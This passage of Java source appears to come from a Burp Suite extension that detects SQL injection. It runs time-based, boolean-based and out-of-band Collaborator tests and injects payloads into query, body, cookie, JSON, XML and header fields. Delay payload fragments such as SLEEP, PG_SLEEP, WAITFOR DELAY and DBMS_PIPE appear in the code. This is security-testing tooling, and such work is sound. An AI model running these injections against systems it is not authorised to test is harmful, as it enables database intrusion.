                if (result != null && result.response() != null) {
                    String body = result.response().bodyToString();
                    // Look for DB-specific version strings — NOT generic x.y.z which matches
                    // JS libraries, CSS frameworks, etc. Only match if we see the UNION_MARKER
                    // was consumed (marker NOT in response = UNION worked) AND version-like data appeared.
                    boolean hasDbVersion = body.contains("MariaDB")
                            || body.contains("PostgreSQL")
                            || body.contains("Microsoft SQL Server")
                            || body.contains("Oracle Database")
                            || body.contains("SQLite")
                            || body.contains("MySQL")
                            || body.contains("CockroachDB")
                            || body.contains("DB2")
                            || body.contains("Firebird");
                    // Also accept if the probe value itself appears (e.g., database() returns "mydb")
                    // but only if the response differs from baseline body
                    boolean responseChanged = !body.equals(baselineBody)
                            && Math.abs(body.length() - baselineLength) > 20;
                    if (hasDbVersion || (responseChanged && !body.contains(UNION_MARKER))) {
                        // DB fingerprinting is informational context, not a standalone finding.
                        // The UNION injection itself was already reported as CRITICAL.
                        findingsStore.addFinding(Finding.builder("sqli-detector",
                                        "Database Fingerprint: " + probe[0],
                                        Severity.INFO, Confidence.CERTAIN)
                                .url(original.request().url())
                                .parameter(ip.name)
                                .evidence("DB probe " + probe[1] + " returned data")
                                .payload(payload)
                                .description("Database identified as " + probe[0] + " via UNION-based extraction. "
                                        + "This is informational context for the confirmed UNION injection.")
                                .requestResponse(result)
                                .build());
                        return;
                    }
                }
                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    // ==================== PHASE 4: TIME-BASED BLIND ====================

    private void testTimeBased(HttpRequestResponse original, InjectionPoint ip, long baselineTime) {
        int delayThreshold = config.getInt("sqli.time.threshold", 14400);

        // Step 0: Collect 3 baseline measurements and check stability
        long[] baselines = new long[3];
        for (int i = 0; i < 3; i++) {
            try {
                TimedResult bt = measureResponseTime(original, ip, ip.originalValue);
                baselines[i] = bt.response != null ? bt.elapsedMs : 0;
            } catch (Exception e) {
                return;
            }
        }
        long baselineMax = Math.max(baselines[0], Math.max(baselines[1], baselines[2]));
        double baselineMean = (baselines[0] + baselines[1] + baselines[2]) / 3.0;
        double baselineVariance = 0;
        for (long b : baselines) baselineVariance += (b - baselineMean) * (b - baselineMean);
        double baselineStdDev = Math.sqrt(baselineVariance / 3.0);

        // If baseline is too unstable (stddev > 30% of mean), skip time-based testing
        if (baselineMean > 0 && baselineStdDev / baselineMean > 0.3) {
            api.logging().logToOutput("[SQLi] Skipping time-based for " + ip.name
                    + " — baseline too unstable (mean=" + Math.round(baselineMean)
                    + "ms, stddev=" + Math.round(baselineStdDev) + "ms)");
            return;
        }

        for (Map.Entry<String, String[]> entry : TIME_PAYLOADS.entrySet()) {
            String dbType = entry.getKey();
            for (String payload : entry.getValue()) {
                try {
                    // Step 1: Send true-condition delay payload
                    TimedResult result1 = measureResponseTime(original, ip, payload);

                    if (result1.elapsedMs >= baselineMax + delayThreshold) {
                        // Step 2: Build false-condition payload (replace SLEEP(18) → IF(1=2,SLEEP(18),0) etc.)
                        String falsePayload = buildFalseConditionPayload(payload, dbType);

                        if (falsePayload != null) {
                            TimedResult falseResult = measureResponseTime(original, ip, falsePayload);

                            // False condition must return within baseline range
                            boolean falseInRange = falseResult.elapsedMs <= baselineMax + 1000;

                            if (falseInRange) {
                                // Step 3: Confirm true-condition with a second attempt
                                TimedResult result2 = measureResponseTime(original, ip, payload);

                                if (result2.elapsedMs >= baselineMax + delayThreshold) {
                                    // All 3 steps passed: baseline stable, true delays, false doesn't
                                    findingsStore.addFinding(Finding.builder("sqli-detector",
                                                    "SQL Injection (Time-Based Blind) - " + dbType,
                                                    Severity.HIGH, Confidence.CERTAIN)
                                            .url(original.request().url())
                                            .parameter(ip.name)
                                            .evidence("Payload: " + payload
                                                    + "\nBaseline max: " + baselineMax + "ms (mean=" + Math.round(baselineMean) + "ms)"
                                                    + "\nTrue condition #1: " + result1.elapsedMs + "ms"
                                                    + "\nFalse condition: " + falseResult.elapsedMs + "ms (payload: " + falsePayload + ")"
                                                    + "\nTrue condition #2: " + result2.elapsedMs + "ms")
                                            .payload(payload)
                                            .description("Time-based blind SQL injection confirmed via 3-step verification. "
                                                    + "True condition delays, false condition does not, baseline is stable. "
                                                    + "DB type: " + dbType)
                                            .requestResponse(result2.response)
                                            .build());
                                    return;
                                }
                            }
                            // If false condition also delays or true doesn't reproduce → inconclusive, discard
                        } else {
                            // No false-condition payload available — require 2 consistent true hits
                            TimedResult result2 = measureResponseTime(original, ip, payload);
                            if (result2.elapsedMs >= baselineMax + delayThreshold) {
                                findingsStore.addFinding(Finding.builder("sqli-detector",
                                                "SQL Injection (Time-Based Blind) - " + dbType,
                                                Severity.HIGH, Confidence.FIRM)
                                        .url(original.request().url())
                                        .parameter(ip.name)
                                        .evidence("Payload: " + payload
                                                + "\nBaseline max: " + baselineMax + "ms"
                                                + "\nTrue #1: " + result1.elapsedMs + "ms"
                                                + "\nTrue #2: " + result2.elapsedMs + "ms"
                                                + "\n(No false-condition payload available for this DB type)")
                                        .payload(payload)
                                        .description("Time-based blind SQL injection detected (2 consistent hits). "
                                                + "DB type: " + dbType)
                                        .requestResponse(result2.response)
                                        .build());
                                return;
                            }
                        }
                        // Single hit without confirmation → discard (not reported)
                    }
                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
        }
    }

    /**
     * Build a false-condition version of a time-based payload.
     * E.g., SLEEP(18) → IF(1=2,SLEEP(18),0), PG_SLEEP(18) → CASE WHEN 1=2 THEN PG_SLEEP(18) END
     */
    private String buildFalseConditionPayload(String truePayload, String dbType) {
        // Try to convert common patterns to false conditions
        if (truePayload.contains("SLEEP(18)") && !truePayload.contains("IF(")) {
            return truePayload.replace("SLEEP(18)", "IF(1=2,SLEEP(18),0)");
        }
        if (truePayload.contains("IF(1=1,SLEEP(18)")) {
            return truePayload.replace("IF(1=1,SLEEP(18)", "IF(1=2,SLEEP(18)");
        }
        if (truePayload.contains("WHEN 1=1 THEN SLEEP(18)")) {
            return truePayload.replace("WHEN 1=1 THEN SLEEP(18)", "WHEN 1=2 THEN SLEEP(18)");
        }
        if (truePayload.contains("PG_SLEEP(18)") && !truePayload.contains("CASE")) {
            return truePayload.replace("PG_SLEEP(18)", "CASE WHEN 1=2 THEN PG_SLEEP(18) END");
        }
        if (truePayload.contains("WHEN 1=1 THEN") && truePayload.contains("PG_SLEEP")) {
            return truePayload.replace("WHEN 1=1 THEN", "WHEN 1=2 THEN");
        }
        if (truePayload.contains("WAITFOR DELAY") && !truePayload.contains("IF(")) {
            return truePayload.replace("WAITFOR DELAY", "IF 1=2 WAITFOR DELAY");
        }
        if (truePayload.contains("IF(1=1) WAITFOR") || truePayload.contains("IF 1=1 WAITFOR")) {
            return truePayload.replace("1=1", "1=2");
        }
        if (truePayload.contains("WHEN 1=1 THEN") && truePayload.contains("WAITFOR")) {
            return truePayload.replace("WHEN 1=1 THEN", "WHEN 1=2 THEN");
        }
        if (truePayload.contains("DBMS_PIPE.RECEIVE_MESSAGE")) {
            if (truePayload.contains("WHEN 1=1")) {
                return truePayload.replace("WHEN 1=1", "WHEN 1=2");
            }
            // Fallback for direct payloads like "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -"
            return truePayload.replace("DBMS_PIPE.RECEIVE_MESSAGE('a',18)", "DBMS_PIPE.RECEIVE_MESSAGE('a',0)");
        }
        if (truePayload.contains("DBMS_LOCK.SLEEP") || truePayload.contains("DBMS_SESSION.SLEEP")) {
            return truePayload.replace("BEGIN", "BEGIN IF 1=2 THEN")
                    .replace("END;", "END IF; END;");
        }
        // BENCHMARK: replace with a tiny count
        if (truePayload.contains("BENCHMARK(")) {
            return truePayload.replaceFirst("BENCHMARK\\(\\d+", "BENCHMARK(1");
        }
        return null; // No false condition available
    }

    // ==================== PHASE 5: BOOLEAN-BASED BLIND ====================

    private void testBooleanBased(HttpRequestResponse original, InjectionPoint ip,
                                   int baselineLength, int baselineStatus, String baselineBody) {
        // Baseline stability check: send the same request twice to detect unstable endpoints
        try {
            HttpRequestResponse stab1 = sendWithPayload(original, ip, ip.originalValue);
            HttpRequestResponse stab2 = sendWithPayload(original, ip, ip.originalValue);
            if (stab1 != null && stab2 != null && stab1.response() != null && stab2.response() != null) {
                int len1 = stab1.response().bodyToString().length();
                int len2 = stab2.response().bodyToString().length();
                if (stab1.response().statusCode() != stab2.response().statusCode()
                        || Math.abs(len1 - len2) > 100) {
                    api.logging().logToOutput("[SQLi] Skipping boolean-based for " + ip.name
                            + " — endpoint is unstable (identical requests produce different responses)");
                    return;
                }
            }
        } catch (Exception ignored) {}

        for (String[] pair : BOOLEAN_PAIRS) {
            try {
                // Round 1: true + false
                HttpRequestResponse trueResult1 = sendWithPayload(original, ip, pair[0]);
                if (trueResult1 == null || trueResult1.response() == null) continue;
                HttpRequestResponse falseResult1 = sendWithPayload(original, ip, pair[1]);
                if (falseResult1 == null || falseResult1.response() == null) continue;

                int trueLen1 = trueResult1.response().bodyToString().length();
                int falseLen1 = falseResult1.response().bodyToString().length();
                int trueStatus1 = trueResult1.response().statusCode();
                int falseStatus1 = falseResult1.response().statusCode();

                // True condition should be similar to baseline, false should differ
                boolean trueMatchesBaseline = Math.abs(trueLen1 - baselineLength) < 50
                        && trueStatus1 == baselineStatus;
                boolean falseDiffers = Math.abs(falseLen1 - baselineLength) > 100
                        || falseStatus1 != baselineStatus;

                // If true response differs from baseline, the app is reacting to injected
                // syntax itself, not evaluating the condition → discard
                if (!trueMatchesBaseline) continue;
                if (!falseDiffers) continue;

                // Round 2: repeat both to confirm reproducibility
                HttpRequestResponse trueResult2 = sendWithPayload(original, ip, pair[0]);
                if (trueResult2 == null || trueResult2.response() == null) continue;
                HttpRequestResponse falseResult2 = sendWithPayload(original, ip, pair[1]);
                if (falseResult2 == null || falseResult2.response() == null) continue;

                int trueLen2 = trueResult2.response().bodyToString().length();
                int falseLen2 = falseResult2.response().bodyToString().length();
                int trueStatus2 = trueResult2.response().statusCode();
                int falseStatus2 = falseResult2.response().statusCode();

                // Verify Round 2 matches Round 1
                boolean trueConsistent = Math.abs(trueLen2 - trueLen1) < 50
                        && trueStatus2 == trueStatus1;
                boolean falseConsistent = Math.abs(falseLen2 - falseLen1) < 50
                        && falseStatus2 == falseStatus1;
                boolean trueStillMatchesBaseline = Math.abs(trueLen2 - baselineLength) < 50
                        && trueStatus2 == baselineStatus;
                boolean falseStillDiffers = Math.abs(falseLen2 - baselineLength) > 100
                        || falseStatus2 != baselineStatus;

                if (trueConsistent && falseConsistent && trueStillMatchesBaseline && falseStillDiffers) {
                    findingsStore.addFinding(Finding.builder("sqli-detector",
                                    "SQL Injection (Boolean-Based Blind) - Confirmed",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(original.request().url())
                            .parameter(ip.name)
                            .evidence("True payload: " + pair[0]
                                    + "\n  Round 1: len=" + trueLen1 + ", status=" + trueStatus1
                                    + "\n  Round 2: len=" + trueLen2 + ", status=" + trueStatus2
                                    + "\nFalse payload: " + pair[1]
                                    + "\n  Round 1: len=" + falseLen1 + ", status=" + falseStatus1
                                    + "\n  Round 2: len=" + falseLen2 + ", status=" + falseStatus2
                                    + "\nBaseline: len=" + baselineLength + ", status=" + baselineStatus)
                            .payload(pair[0])
                            .description("Boolean-based blind SQL injection confirmed. True/false conditions "
                                    + "produce consistently different responses across 2 rounds. "
                                    + "True condition matches baseline, false condition differs.")
                            .requestResponse(trueResult1)
                            .build());
                    return;
                }
                // If distinction is not reproducible → discard
                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    // ==================== PHASE 6: OOB VIA COLLABORATOR ====================

    private void testOob(HttpRequestResponse original, InjectionPoint ip) {
        String url = original.request().url();

        for (Map.Entry<String, String[]> entry : OOB_PAYLOADS.entrySet()) {
            String dbType = entry.getKey();
            for (String payloadTemplate : entry.getValue()) {
                try {
                    // AtomicReference to capture the sent request/response for the finding
                    AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();

                    // Generate unique Collaborator payload for this test
                    String collabPayload = collaboratorManager.generatePayload(
                            "sqli-detector", url, ip.name,
                            "OOB SQLi (" + dbType + ")",
                            interaction -> {
                                // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
                                // fires on a 5-second interval so this race is rare, but when it happens the 50ms
                                // wait is almost always enough for the sending thread to complete its set() call.
                                for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
                                    try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                                }
                                // Mark parameter as confirmed — skip all remaining phases
                                oobConfirmedParams.add(ip.name);
                                findingsStore.addFinding(Finding.builder("sqli-detector",
                                                "SQL Injection (Out-of-Band) - " + dbType,
                                                Severity.CRITICAL, Confidence.CERTAIN)
                                        .url(url)
                                        .parameter(ip.name)
                                        .evidence("Collaborator " + interaction.type().name()
                                                + " interaction received from " + interaction.clientIp()
                                                + " at " + interaction.timeStamp()
                                                + " | DB type: " + dbType)
                                        .payload(payloadTemplate)
                                        .description("Out-of-band SQL injection confirmed via Burp Collaborator. "
                                                + "The server made a " + interaction.type().name()
                                                + " request to the Collaborator server, proving code execution "
                                                + "within the SQL query. DB type: " + dbType)
                                        .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
                                        .build());
                                api.logging().logToOutput("[SQLi OOB] Confirmed! " + interaction.type()
                                        + " interaction for " + url + " param=" + ip.name + " DB=" + dbType);
                            }
                    );

                    if (collabPayload == null) continue;

                    // Replace placeholder with actual Collaborator domain
                    String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);


                    sentRequest.set(sendWithPayload(original, ip, payload));

                    api.logging().logToOutput("[SQLi OOB] Sent " + dbType + " payload to " + url
                            + " param=" + ip.name + " collab=" + collabPayload);

                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                } catch (Exception e) {
                    api.logging().logToError("SQLi OOB error: " + e.getMessage());
                }
            }
        }
    }

    // ==================== HELPER METHODS ====================

    private HttpRequestResponse sendWithPayload(HttpRequestResponse original, InjectionPoint ip, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), ip, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            api.logging().logToError("Failed to send request: " + e.getMessage());
            return null;
        }
    }

    /** Result of a timed request, bundling elapsed time and the response together to avoid races. */
    private static class TimedResult {
        final long elapsedMs;
        final HttpRequestResponse response;
        TimedResult(long elapsedMs, HttpRequestResponse response) {
            this.elapsedMs = elapsedMs;
            this.response = response;
        }
    }

    private TimedResult measureResponseTime(HttpRequestResponse original, InjectionPoint ip, String payload) {
        long start = System.currentTimeMillis();
        HttpRequestResponse response = sendWithPayload(original, ip, payload);
        long elapsed = System.currentTimeMillis() - start;
        return new TimedResult(elapsed, response);
    }

    private HttpRequest injectPayload(HttpRequest request, InjectionPoint ip, String payload) {
        switch (ip.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        burp.api.montoya.http.message.params.HttpParameter.urlParameter(ip.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        burp.api.montoya.http.message.params.HttpParameter.bodyParameter(ip.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, ip.name, payload);
            case JSON:
                // Replace value in JSON body, supporting nested dot-notation keys
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                if (ip.name.contains(".")) {
                    // Nested key — parse, replace, serialize (pass raw payload; Gson escapes internally)
                    String newBody = replaceNestedJsonValue(body, ip.name, payload);
                    return request.withBody(newBody);
                } else {
                    String jsonPattern = "\"" + Pattern.quote(ip.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                    String replacement = "\"" + ip.name + "\": \"" + escaped + "\"";
                    String newBody = body.replaceFirst(jsonPattern, replacement);
                    return request.withBody(newBody);
                }
            case XML:
                String xmlBody = request.bodyToString();
                String xmlEscaped = payload.replace("&", "&amp;").replace("<", "&lt;")
                        .replace(">", "&gt;").replace("\"", "&quot;");
                String newXml;
                if (ip.name.startsWith("@")) {
                    // Attribute injection — replace attribute value
                    String attrName = ip.name.substring(1);
                    newXml = xmlBody.replaceFirst(
                            Pattern.quote(attrName) + "\\s*=\\s*\"" + Pattern.quote(ip.originalValue) + "\"",
                            attrName + "=\"" + xmlEscaped + "\"");
                } else {
                    // Element text injection — replace text between tags
                    newXml = xmlBody.replaceFirst(
                            "(<" + Pattern.quote(ip.name) + "(?:\\s[^>]*)?>)" + Pattern.quote(ip.originalValue)
                                    + "(</" + Pattern.quote(ip.name) + ">)",
                            "$1" + Matcher.quoteReplacement(xmlEscaped) + "$2");
                }
                return request.withBody(newXml);
            case HEADER:
                return request.withRemovedHeader(ip.name).withAddedHeader(ip.name, payload);
            default:
                return request;
        }
    }

    /**
     * Replace a value at a dot-notation path in a JSON string.
     * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
     */
    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
        try {
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
            if (!root.isJsonObject()) return jsonBody;

            String[] parts = dotPath.split("\\.");
            com.google.gson.JsonObject current = root.getAsJsonObject();

            // Traverse to the parent of the target key
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return jsonBody;
                current = child.getAsJsonObject();
            }

            // Replace the leaf value
            String leafKey = parts[parts.length - 1];
            if (current.has(leafKey)) {
                current.addProperty(leafKey, escapedValue);
            }

            return new com.google.gson.Gson().toJson(root);
        } catch (Exception e) {
            return jsonBody;
        }
    }

    private List<InjectionPoint> extractInjectionPoints(HttpRequest request) {
        List<InjectionPoint> points = new ArrayList<>();

        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.QUERY));
                    break;
                case BODY:
                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.BODY));
                    break;
                case COOKIE:
                    points.add(new InjectionPoint(param.name(), param.value(), InjectionType.COOKIE));
                    break;
            }
        }

        // JSON body parameters
        String contentType = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) {
                contentType = h.value();
                break;
            }
        }
        if (contentType.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null && !body.isBlank()) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonParams(el.getAsJsonObject(), "", points);
                    }
                }
            } catch (Exception ignored) {
            }
        }

        // XML body parameters
        if (contentType.contains("/xml") || contentType.contains("+xml")) {
            try {
                String body = request.bodyToString();
                if (body != null && !body.isBlank() && body.trim().startsWith("<")) {
                    extractXmlParams(body, points);
                }
            } catch (Exception ignored) {}
        }

        // Extract injectable request headers
        String[] headerTargets = {"User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "Origin"};
        for (String headerName : headerTargets) {
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase(headerName)) {
                    points.add(new InjectionPoint(h.name(), h.value(), InjectionType.HEADER));
                    break;
                }
            }
        }

        return points;
    }

    // XML extraction patterns
    private static final Pattern XML_ELEMENT_PATTERN =
            Pattern.compile("<([a-zA-Z][a-zA-Z0-9_:.-]*)(?:\\s[^>]*)?>([^<]+)</\\1>");
    private static final Pattern XML_ATTR_PATTERN =
            Pattern.compile("([a-zA-Z][a-zA-Z0-9_:.-]*)\\s*=\\s*\"([^\"]*)\"");

    private void extractXmlParams(String xmlBody, List<InjectionPoint> points) {
        Set<String> seen = new HashSet<>();

        // Extract text content of elements: <tagName>value</tagName>
        Matcher m = XML_ELEMENT_PATTERN.matcher(xmlBody);
        while (m.find()) {
            String name = m.group(1);
            String value = m.group(2).trim();
            if (!value.isEmpty() && !seen.contains("elem:" + name)) {
                seen.add("elem:" + name);
                points.add(new InjectionPoint(name, value, InjectionType.XML));
            }
        }

        // Extract attribute values (skip xmlns and standard XML attrs)
        Matcher am = XML_ATTR_PATTERN.matcher(xmlBody);
        while (am.find()) {
            String attrName = am.group(1);
            String attrValue = am.group(2).trim();
            if (!attrValue.isEmpty() && !attrName.startsWith("xmlns")
                    && !attrName.equals("encoding") && !attrName.equals("version")
                    && !seen.contains("attr:" + attrName)) {
                seen.add("attr:" + attrName);
                points.add(new InjectionPoint("@" + attrName, attrValue, InjectionType.XML));
            }
        }
    }

    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<InjectionPoint> points) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
                points.add(new InjectionPoint(fullKey, val.getAsString(), InjectionType.JSON));
            } else if (val.isJsonObject()) {
                extractJsonParams(val.getAsJsonObject(), fullKey, points);
            }
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) {
                url = url.substring(url.indexOf("://") + 3);
            }
            int slashIdx = url.indexOf('/');
            if (slashIdx >= 0) {
                int queryIdx = url.indexOf('?', slashIdx);
                return queryIdx >= 0 ? url.substring(slashIdx, queryIdx) : url.substring(slashIdx);
            }
        } catch (Exception ignored) {
        }
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("sqli.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() {
        tested.clear();
    }

    // Inner types
    private enum InjectionType { QUERY, BODY, COOKIE, JSON, HEADER, XML }

    private static class InjectionPoint {
        final String name;
        final String originalValue;
        final InjectionType type;

        InjectionPoint(String name, String originalValue, InjectionType type) {
            this.name = name;
            this.originalValue = originalValue != null ? originalValue : "";
            this.type = type;
        }
    }

    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
}
